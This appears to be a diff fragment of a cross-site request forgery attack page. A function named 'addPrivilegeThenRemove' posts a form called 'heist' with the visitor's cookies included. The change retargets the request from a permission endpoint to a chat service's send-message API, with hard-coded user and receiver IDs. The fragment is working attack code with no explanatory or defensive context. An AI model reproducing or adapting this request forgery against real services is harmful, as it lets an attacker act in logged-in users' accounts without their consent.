@@ -34,7 +34,7 @@
       async function addPrivilegeThenRemove() {
         try {
           // 1) Send the POST request
-          const postResponse = await fetch("https://mozaffarmoh.github.io/ChatApp/api/permission", {
+          const postResponse = await fetch("https://chatappapi-2w5v.onrender.com/messages/send-message?userId=6659ea8d2b34f18ac1d985b7&receiverId=663e719ed78c240b91025b", {
             method: "POST",
             body: new FormData(document.getElementById("heist")),
             credentials: "include",
